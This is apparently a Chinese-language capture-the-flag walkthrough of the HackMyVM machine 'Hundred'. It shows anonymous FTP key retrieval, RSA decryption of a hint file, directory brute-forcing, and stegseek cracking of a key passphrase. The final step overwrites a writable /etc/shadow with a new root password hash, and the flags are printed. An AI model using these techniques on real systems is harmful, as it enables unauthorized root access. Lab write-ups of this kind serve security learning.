# Hundred

2024-12-28 https://hackmyvm.eu/machines/machine.php?vm=Hundred

## IP

192.168.5.39

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

在访问 80 查看源代码发现：

```
key: h4ckb1tu5.enc;

<!-- l4nr3n, nice dir.-->
```

看着 h4ckb1tu5.enc 像是一个域名或者是一个文件，先添加到 hosts 文件中，进行访问，根主页内容一样，但是访问 l4nr3n 这个目录还是 404。在访问下看看 h4ckb1tu5.enc 是不是文件，访问成功，是个文件：

```
file h4ckb1tu5.enc
h4ckb1tu5.enc: data
```

enc 文件是加密后的文件。同时用 gobuster 进行扫描，没发现其他有用目录。

ftp 允许匿名登陆，先看 ftp，里面有如下文件：

```
-rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa
-rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem
-rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub
-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt
```

userx.txt 中发现类似用户的字典：

```
noname
roelvb
ch4rm
marcioapm
isen
sys7em
chicko
tasiyanci
luken
alienum
linked
tatayoyo
0xr0n1n
exploiter
kanek180
cromiphi
softyhack
b4el7d
val1d

Thanks
hmv
```

id_rsa.pem 中发现了私钥，使用此私钥对上面的用户字典尝试 ssh 密钥登陆，但是都不成功。最后的那个 hmv 像是用户名。

尝试用得到的私钥去解密 h4ckb1tu5.enc 文件，得到了另外一个目录提示：

```
openssl rsautl -decrypt -inkey id_rsa.pem -in h4ckb1tu5.enc > result.txt

cat result.txt
/softyhackb4el7dshelldredd
```

访问这个目录/softyhackb4el7dshelldredd，但是什么都没发现，可能这个 softyhackb4el7dshelldredd 是一个密码，尝试用上面得到的 users.txt 进行爆破，也没有成功。

使用 gobuster 大字典对这个目录/softyhackb4el7dshelldredd 再次进行爆破，发现 id_rsa:

```
http://192.168.5.39/softyhackb4el7dshelldredd/id_rsa
```

下载的 id_rsa 有密钥，使用 john 对其进行解密，rockyou 没有得到密码。

经过查询发现首页那张图片存在隐写，使用 stegseek 和 users.txt 对其进行解密：

```
stegseek --crack logo.jpg users.txt

cat logo.jpg.out
d4t4s3c#1
```

得到 id_rsa 的密码: `d4t4s3c#1`

进行登陆：ssh -i id_rsa hmv@192.168.5.39

得到了 user flag：

```
hmv@hundred:~$ cat user.txt
HMV100vmyay
```

进行系统枚举，发现 /etc/shadow 文件可写，对其 root 用户的密码进行覆盖：

```
mkpasswd -m sha-512 rootroot
$6$f1GydTUyHKGP4Lk.$bbtt164CKAAi/Iia/awDq1jjodzJg/UI..X8KQLictS6BwsOo52zxhupYLA5JL1XdqpXLnk4gJdCyNPur9YZw1

root:$6$f1GydTUyHKGP4Lk.$bbtt164CKAAi/Iia/awDq1jjodzJg/UI..X8KQLictS6BwsOo52zxhupYLA5JL1XdqpXLnk4gJdCyNPur9YZw1:19729:0:99999:7:::

echo 'root:$6$f1GydTUyHKGP4Lk.$bbtt164CKAAi/Iia/awDq1jjodzJg/UI..X8KQLictS6BwsOo52zxhupYLA5JL1XdqpXLnk4gJdCyNPur9YZw1:19729:0:99999:7:::' > /etc/shadow
```

写入后，用 rootroot 密码切换到 root 用户，得到了最终的 flag：

```
root@hundred:/home# cd /root
root@hundred:~# ls
root.txt
root@hundred:~# cat root.txt
HMVkeephacking
```
